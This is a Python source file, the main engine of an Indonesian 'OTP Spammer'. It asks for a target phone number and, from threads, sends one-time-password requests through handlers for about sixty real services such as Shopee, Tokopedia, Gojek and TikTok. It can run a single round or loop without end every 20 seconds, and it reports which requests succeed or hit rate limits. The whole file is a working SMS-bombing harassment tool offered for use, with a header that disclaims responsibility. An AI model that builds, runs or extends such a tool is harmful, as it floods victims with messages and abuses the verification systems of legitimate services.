#!/usr/bin/env python3
# main_engine.py - OTP Spammer Engine (FIXED)
# "I just give the tools, whether they're used right or not is your business, boss."

import requests
import uuid
import random
import string
import time
import re
import json
import threading
import sys
import signal
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed

from license import (
    log_info, log_success, log_warning, log_error, log_input, 
    RATE_LIMIT_KEYWORDS, get_active_apis, is_admin_number
)
from utils import normalize, fmt_08, fmt_nocode, fmt_plus, fmt_phone_only, get_public_ip, generate_multipart, extract_csrf, get_random_user_agent, get_headers_with_random_ua
from handlers import ALL_HANDLERS
from targets import TARGETS

print_lock = threading.Lock()
stop_flag = False

def log_target(idx, total, name, status, detail=""):
    with print_lock:
        if status == "SUCCESS":
            sym, col = "+", Fore.GREEN
        elif status == "LIMITED" or status == "BLOCKED":
            sym, col = "!", Fore.YELLOW
        else:
            sym, col = "-", Fore.RED
        print(f"{col}[{sym}]{Style.RESET_ALL} ({idx}/{total}) {name}: {status}" + (f" - {detail}" if detail else ""))

def get_handler_function(name):
    """
    Ambil fungsi handler berdasarkan nama, dengan fallback
    """
    # Mapping nama handler ke fungsi di ALL_HANDLERS
    handler_map = {
        'PlanetBan': 'planetban',
        'Hash Micro': 'hashmicro',
        'TuneUp': 'tuneup',
        'Internet Rakyat': 'internetrakyat',
        'Ultramilk': 'ultramilk',
        'Kaniva International Bali': 'kaniva',
        'Jembatani': 'jembatani',
        'RCX': 'rcx',
        'Sahabat Teknisi': 'sahabatteknisi',
        'Auto2000': 'auto2000',
        '99.co': '99co',
        'Beli Rumah': 'belirumah',
        'Fastwork': 'fastwork',
        'Astra Daihatsu': 'astra_daihatsu',
        'Royal Canin': 'royal_canin',
        'Watsons': 'watsons',
        'HRS': 'hrsbre',
        'Erafone': 'erafone',
        'Beautyhaul': 'beautyhaul',
        'Hainaya': 'hainaya',
        'MinumYukKaka': 'minumyukkaka',
        'SIDEMANG': 'sidemang',
        'LaporMasBup': 'lapormasbup',
        'PTSP Kemenag': 'ptsp_kemenag',
        'Pinhome': 'pinhome',
        'Rumah123': 'rumah123',
        'Paper': 'paper',
        'Bonus Belanja': 'bonusbelanja',
        'Dunia Games': 'duniagames',
        'Hijup': 'hijup',
        'Alodokter': 'alodokter',
        'Blibli Tiket': 'bliblitiket',
        'Matahari': 'matahari',
        'Ohsome': 'ohsome',
        'Optik Melawai': 'optikmelawai',
        'Holland Bakery': 'hollandbakery',
        'Bunda Hospital': 'bunda',
        'Maulagi': 'maulagi',
        'ACC': 'acc',
        'Absenku': 'absenku',
        'Saturdays': 'saturdays',
        'Singa': 'singa',
        'Adiraku': 'adiraku',
        'TikTok': 'tiktok',
        'OLX': 'olx',
        'Indihome': 'indihome',
        'Klook': 'klook',
        'Halodoc': 'halodoc',
        'Sayurbox': 'sayurbox',
        'Carsome': 'carsome',
        'Pizza Hut': 'pizzahut',
        'Shopee': 'shopee',
        'Tokopedia': 'tokopedia',
        'Gojek': 'gojek',
        'Blibli': 'blibli',
        'Bukalapak': 'bukalapak',
        'Lazada': 'lazada',
        'JD.ID': 'jdid',
        'Zalora': 'zalora',
        'Sociolla': 'sociolla',
    }
    
    key = handler_map.get(name, name.lower().replace(' ', '_'))
    
    # Coba ambil dari ALL_HANDLERS
    if key in ALL_HANDLERS:
        return ALL_HANDLERS[key]
    
    # Coba cari dengan prefix send_
    func_name = f"send_{key}_otp"
    if func_name in globals():
        return globals()[func_name]
    
    # Coba cari dengan nama yang sama
    if name in ALL_HANDLERS:
        return ALL_HANDLERS[name]
    
    return None

def process_target(api, target62, ip, idx, total):
    global stop_flag
    if stop_flag:
        return False
        
    name = api['name']
    status_text = "FAIL"
    detail = ""
    success = False

    try:
        # Coba ambil handler function
        handler_func = get_handler_function(name)
        
        if handler_func:
            # Panggil handler langsung
            try:
                resp = handler_func(target62)
                if resp is not None:
                    if hasattr(resp, 'status_code'):
                        status_code = resp.status_code
                        if status_code in [200, 201, 202, 204]:
                            status_text = "SUCCESS"
                            detail = "OTP sent"
                            success = True
                        elif status_code == 429:
                            status_text = "LIMITED"
                            detail = "Rate limit"
                        elif status_code == 403:
                            status_text = "BLOCKED"
                            detail = "Forbidden"
                        else:
                            try:
                                text = resp.text.lower() if hasattr(resp, 'text') else ""
                                if 'success' in text or 'otp' in text or 'berhasil' in text or 'sent' in text:
                                    status_text = "SUCCESS"
                                    detail = "OTP triggered"
                                    success = True
                                else:
                                    detail = f"({status_code})"
                            except:
                                detail = f"({status_code})"
                    else:
                        # Response bukan HTTP response, tapi mungkin dict atau tuple
                        if isinstance(resp, dict):
                            if resp.get('success') or resp.get('status') == 'success':
                                status_text = "SUCCESS"
                                detail = "OTP sent"
                                success = True
                            else:
                                detail = str(resp)[:60]
                        elif isinstance(resp, tuple) and len(resp) >= 2:
                            code = resp[0]
                            if code == 200:
                                status_text = "SUCCESS"
                                detail = "OTP sent"
                                success = True
                            else:
                                detail = f"({code})"
                        else:
                            status_text = "SUCCESS"
                            detail = "OTP triggered"
                            success = True
                else:
                    status_text = "ERROR"
                    detail = "No response"
            except Exception as e:
                status_text = "ERROR"
                detail = str(e)[:40]
        else:
            # Fallback: pake method lama (dari targets.py)
            status_text = "SKIP"
            detail = "No handler"
            log_target(idx, total, name, status_text, detail)
            return False

    except Exception as e:
        status_text = "ERROR"
        detail = str(e)[:40]

    log_target(idx, total, name, status_text, detail)
    return success

def run_single_round(threads=5):
    global stop_flag
    stop_flag = False
    
    log_info(f"Menjalankan Single Round dengan {threads} thread...")
    
    total_apis = get_active_apis()
    print()
    print(f"{Fore.CYAN}Memulai spam menggunakan {Fore.WHITE}{total_apis}{Fore.CYAN} API{Style.RESET_ALL}")
    print()
    
    target62 = log_input("Nomor target (08xx / +62xx): ").strip()
    
    if not target62:
        log_error("Nomor tidak boleh kosong!")
        return False
    
    target62 = normalize(target62)
    if not target62:
        log_error("Format nomor tidak valid. Gunakan format 08xx atau +62xx")
        return False
    
    if is_admin_number(target62):
        print()
        log_error("Peringatan! Nomor ini adalah nomor ADMIN.")
        log_error("Tidak diperbolehkan melakukan spam ke nomor admin.")
        log_error("Mohon gunakan nomor target lain.")
        print()
        input("Tekan Enter untuk kembali ke menu...")
        return False
    
    ip = get_public_ip()
    success_count = 0
    total_targets = len(TARGETS)
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        log_warning("Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for idx, api in enumerate(TARGETS):
                if stop_flag:
                    break
                futures.append(executor.submit(process_target, api, target62, ip, idx+1, total_targets))
            
            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break
                try:
                    if future.result():
                        success_count += 1
                except:
                    pass
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
    
    if stop_flag:
        log_warning("Proses dihentikan oleh user (Ctrl+C)")
        log_info(f"Total sukses: {success_count}/{total_targets} (sebelum dihentikan)")
    else:
        log_info(f"Selesai. Sukses: {success_count}/{total_targets}")
    
    return success_count > 0

def run_infinite_loop():
    global stop_flag
    stop_flag = False
    
    total_apis = get_active_apis()
    print()
    print(f"{Fore.CYAN}Memulai spam menggunakan {Fore.WHITE}{total_apis}{Fore.CYAN} API{Style.RESET_ALL}")
    print()
    
    log_info("Menjalankan Infinite Loop (delay 20 detik)...")
    target62 = log_input("Nomor target (08xx / +62xx): ").strip()
    
    if not target62:
        log_error("Nomor tidak boleh kosong!")
        return
    
    target62 = normalize(target62)
    if not target62:
        log_error("Format nomor tidak valid. Gunakan format 08xx atau +62xx")
        return
    
    if is_admin_number(target62):
        print()
        log_error("Peringatan! Nomor ini adalah nomor ADMIN.")
        log_error("Tidak diperbolehkan melakukan spam ke nomor admin.")
        log_error("Mohon gunakan nomor target lain.")
        print()
        input("Tekan Enter untuk kembali ke menu...")
        return
    
    ip = get_public_ip()
    total_success = 0
    total_fail = 0
    round_count = 0
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        log_warning("Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        while True:
            if stop_flag:
                break
            round_count += 1
            log_info(f"Round {round_count} dimulai...")
            success_count = 0
            total_targets = len(TARGETS)
            
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = []
                for idx, api in enumerate(TARGETS):
                    if stop_flag:
                        break
                    futures.append(executor.submit(process_target, api, target62, ip, idx+1, total_targets))
                
                for future in as_completed(futures):
                    if stop_flag:
                        for f in futures:
                            f.cancel()
                        break
                    try:
                        if future.result():
                            success_count += 1
                            total_success += 1
                        else:
                            total_fail += 1
                    except:
                        total_fail += 1
            
            if stop_flag:
                break
                
            log_info(f"Round {round_count} selesai. Sukses: {success_count}/{total_targets}")
            log_info(f"Total: success={total_success} | fail={total_fail}")
            log_info("Menunggu 20 detik...")
            
            for _ in range(20):
                if stop_flag:
                    break
                time.sleep(1)
            
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
    
    if stop_flag:
        log_warning("Proses dihentikan oleh user (Ctrl+C)")
        log_info(f"Total success: {total_success} | fail: {total_fail}")

def run_custom_thread(threads=5):
    global stop_flag
    stop_flag = False
    
    total_apis = get_active_apis()
    print()
    print(f"{Fore.CYAN}Memulai spam menggunakan {Fore.WHITE}{total_apis}{Fore.CYAN} API{Style.RESET_ALL}")
    print()
    
    log_info(f"Menjalankan dengan {threads} thread...")
    target62 = log_input("Nomor target (08xx / +62xx): ").strip()
    
    if not target62:
        log_error("Nomor tidak boleh kosong!")
        return
    
    target62 = normalize(target62)
    if not target62:
        log_error("Format nomor tidak valid. Gunakan format 08xx atau +62xx")
        return
    
    if is_admin_number(target62):
        print()
        log_error("Peringatan! Nomor ini adalah nomor ADMIN.")
        log_error("Tidak diperbolehkan melakukan spam ke nomor admin.")
        log_error("Mohon gunakan nomor target lain.")
        print()
        input("Tekan Enter untuk kembali ke menu...")
        return
    
    ip = get_public_ip()
    success_count = 0
    total_targets = len(TARGETS)
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        log_warning("Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for idx, api in enumerate(TARGETS):
                if stop_flag:
                    break
                futures.append(executor.submit(process_target, api, target62, ip, idx+1, total_targets))
            
            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break
                try:
                    if future.result():
                        success_count += 1
                except:
                    pass
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
    
    if stop_flag:
        log_warning("Proses dihentikan oleh user (Ctrl+C)")
        log_info(f"Total sukses: {success_count}/{total_targets} (sebelum dihentikan)")
    else:
        log_info(f"Selesai. Sukses: {success_count}/{total_targets}")
